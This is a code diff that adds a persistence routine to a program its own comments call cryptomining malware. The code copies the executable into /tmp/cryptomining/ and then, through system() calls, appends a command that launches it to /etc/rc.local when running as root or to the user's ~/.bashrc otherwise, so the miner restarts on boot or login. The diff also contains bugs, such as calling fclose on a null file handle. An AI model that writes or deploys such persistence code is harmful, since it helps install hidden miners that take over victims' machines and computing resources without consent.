@@ -154,23 +154,48 @@ void new_miner(){
 
 void install_persistence(){
 
+    /* Create folder and copy malware to it */
     if(create_cryptomining_folder()){
         copy_executable_to_folder();
+    }else{
+        FILE *f = fopen(executable_path, "rb");
+        if(f == NULL){
+            copy_executable_to_folder();
+            fclose(f);
+        }
     }
 
-    char * bashrc = ".bashrc";
-    char * home = get_home_enviroment();
-    std::string caminho = std::string(home) += std::string(bashrc);
-    const char * path = caminho.c_str();
+    /* Persist the malware */
+    std::string x;
+    const char * command = (x = std::string("./") += std::string(executable_path)).c_str();
+    
+    std::string caminho;
+    const char * bashrc_path = (caminho = std::string(get_home_enviroment()) += std::string(".bashrc")).c_str();
 
-    if(is_root){
+    if(is_root()){
         char * rc_local = "/etc/rc.local";
+        FILE *f = fopen(rc_local, "r");
 
+        /* If file doesnt exist, create file */
+        if(f == NULL){
+            FILE *g = fopen(rc_local, "w");
+            fclose(g);
+        }
+        fclose(f);
 
-        system("");
+        std::string comando2;
+        const char * command2 = (comando2 = std::string("echo \"") += x +=
+        std::string("\" >> ") += std::string(rc_local)).c_str();
+
+        system(command2);
         return;
     
     }else{
+        std::string comando3;
+        const char * command3 = (comando3 = std::string("echo \"") += x
+        += std::string("\" >> ") += std::string(bashrc_path)).c_str();
+
+        system(command3);
 
         return;
     }
@@ -211,18 +236,18 @@ void copy_executable_to_folder(){
     if (outputFd == -1)
         exit(-1);
 
-    /* transfer data until we encounter end of input or an error */
-
     while ((numRead = read(inputFd, buf, 1024)) > 0){
     if (write(outputFd, buf, numRead) != numRead)
-        Error::log_error("Error copying executable to /tmp/cryptomining/");
+        Error::log_error("[-] Error copying executable to /tmp/cryptomining/");
     }
 
     if (numRead == -1)
-        Error::log_error("Error copying executable to /tmp/cryptomining/");
+        Error::log_error("[-] Error copying executable to /tmp/cryptomining/");
 
     if (close(inputFd) == -1)
         return;
     if (close(outputFd) == -1)
         return;
+
+    // CHMOD
 }
